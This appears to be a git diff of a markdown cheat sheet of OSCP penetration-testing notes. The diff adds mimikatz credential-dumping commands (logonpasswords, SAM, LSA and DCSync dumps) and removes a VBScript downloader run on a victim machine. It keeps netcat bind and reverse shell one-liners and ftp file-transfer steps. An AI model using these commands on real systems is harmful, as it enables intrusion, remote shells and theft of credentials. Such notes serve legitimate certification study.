@@ -1,7 +1,5 @@
+<b>This is a mixture of my notes and other notes that I have gathered on my OSCP path.</b> 
 
-<b>Enable service on every reboot:</b>
-
-	update-rc.d <[SERVICE]> enable
 
 <b>Extract link from html page:</b>
 
@@ -26,23 +24,21 @@
 
 # Bind vs Reverse Shell
 
-<img src="https://raw.github.com/SynAckPwn23/Go-For-OSCP/master/Uploads/img/Bind_Reverse_shell.png" width="500"/>
-
 <b>Bind Shell:</b>
 
 Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:
 
-	(BOB): nc -nlvp <[PORT]> -e cmd.exe
+	(User 1): nc -nlvp <[PORT]> -e cmd.exe
 
-	(ALICE): nc -nv <[BOB_IP]> <[PORT]>
+	(User 2): nc -nv <[BOB_IP]> <[PORT]>
 
 <b>Reverse Shell:</b>
 
 Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:
 
-	(ALICE): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash
+	(User 1): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash
 
-	(BOB): nc -nlvp <[PORT]>
+	(User 2): nc -nlvp <[PORT]>
 
 # Zone Transfer
 
@@ -183,61 +179,27 @@ On victim machine shell:
 	
 	ftp -v -n -s:ftp.txt
 	
-<b>VBScript (in Windows XP, 2003)</b>
+<b>AD Time</b>
 
-On victim machine shell:
+If you have a high priv user account use mimikatz:
 
-	echo strUrl = WScript.Arguments.Item(0) > wget.vbs &
-	
-	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs &
-	
-	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs &
-	
-	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs &
-	
-	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs &
-	
-	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs &
-	
-	echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs &
-	
-	echo Err.Clear >> wget.vbs &
-	
-	echo Set http = Nothing >> wget.vbs &
-	
-	echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs &
-	
-	echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs &
-	
-	echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs &
-	
-	echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs &
-	
-	echo http.Open "GET", strURL, False >> wget.vbs &
-	
-	echo http.Send >> wget.vbs &
-	
-	echo varByteArray = http.ResponseBody >> wget.vbs &
-	
-	echo Set http = Nothing >> wget.vbs &
-	
-	echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs &
-	
-	echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs &
-	
-	echo strData = "" >> wget.vbs &
-	
-	echo strBuffer = "" >> wget.vbs &
-	
-	echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs &
-	
-	echo ts.Write Chr(255 And Ascb(Midb(varByteArray, lngCounter +1, 1))) >> wget.vbs &
-	
-	echo Next >> wget.vbs &
-	
-	echo ts.Close >> wget.vbs
+<b>FIRST CHECK FOR USERS</b>
+	net users /domain
 
-	cscript wget.vbs http://<[IP]>/<[FILE]> <[FILE_NAME]>
+	`privilege::debug`
+
+	`token::elevate`
+
+	`sekurlsa::logonpasswords`
+
+	`lsadump::lsa /inject`
+
+	`lsadump::sam`
+	
+	`lsadump::lsa /patch`
+
+	`lsadump::dcsync /user:xxx`
+	
 	
 <b>Powershell</b> (In Windows 7, 2008 and above)
 
